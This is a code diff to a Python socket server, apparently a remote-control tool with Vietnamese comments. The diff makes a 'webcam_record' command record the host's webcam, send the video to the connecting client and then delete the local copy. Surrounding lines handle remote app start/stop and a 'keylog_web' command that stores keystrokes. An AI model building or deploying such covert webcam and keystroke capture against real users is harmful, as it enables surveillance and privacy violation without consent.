@@ -158,17 +158,14 @@ def capture_full_quality_bytes():
         return None
 
 def record_webcam(seconds):
-    # LƯU Ý: Khi dùng Global Camera, hàm này cần mượn frame từ global
-    # thay vì mở lại VideoCapture(0) (sẽ gây lỗi conflict thiết bị)
-    
     out = None
     try:
         os.makedirs("recordings", exist_ok=True)
         filename = f"recordings/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
         
-        # Lấy kích thước từ frame hiện tại
+        # Lấy kích thước từ frame hiện tại (Global Camera)
         with camera_lock:
-            if global_frame is None: return "[ERROR] Camera not ready"
+            if global_frame is None: return None # Trả về None nếu lỗi
             height, width, _ = global_frame.shape
 
         fourcc = cv2.VideoWriter_fourcc(*'avc1')
@@ -178,17 +175,16 @@ def record_webcam(seconds):
         start_time = time.time()
         
         while (time.time() - start_time) < seconds:
-            # Lấy frame từ luồng global
             with camera_lock:
                 if global_frame is not None:
                     out.write(global_frame)
-            # Ngủ đúng bằng thời gian 1 frame (1/30s)
             time.sleep(0.033)
 
-        return f"[OK] Saved to {os.path.abspath(filename)}"
+        return filename # <--- TRẢ VỀ ĐƯỜNG DẪN FILE
 
     except Exception as e:
-        return f"[ERROR] Webcam record failed: {e}"
+        print(f"[ERROR] Record failed: {e}")
+        return None
     
     finally:
         if out: out.release()
@@ -259,8 +255,30 @@ def handle_client(conn, addr):
                 name = APPS.get(key, " ".join(parts[1:]))
                 result = start_app(name) if command == "start" else stop_app(name)
         elif command == "webcam_record":
-             if len(parts) < 2: result = "[ERROR] args"
-             else: result = record_webcam(int(parts[1]))
+             if len(parts) < 2: 
+                 # Gửi size 0 báo lỗi nếu thiếu tham số
+                 send_image_data(conn, None) 
+                 return
+
+             # 1. Quay video và lấy đường dẫn file
+             video_path = record_webcam(int(parts[1]))
+             
+             if video_path and os.path.exists(video_path):
+                 # 2. Đọc file thành bytes
+                 with open(video_path, "rb") as f:
+                     video_data = f.read()
+                 
+                 # 3. Gửi file về client (Dùng chung hàm gửi ảnh vì cơ chế giống hệt)
+                 send_image_data(conn, video_data)
+                 
+                 # 4. Xóa file trên server để tiết kiệm chỗ (Tùy chọn)
+                 try: os.remove(video_path)
+                 except: pass
+             else:
+                 # Gửi lỗi
+                 send_image_data(conn, None)
+             
+             return # Kết thúc kết nối sau khi gửi file
         elif command == "keylog_web":
              with open("web_keylog.txt", "a") as f: f.write((parts[1] if len(parts)>1 else "")+'\n')
              conn.sendall(b"OK"); return
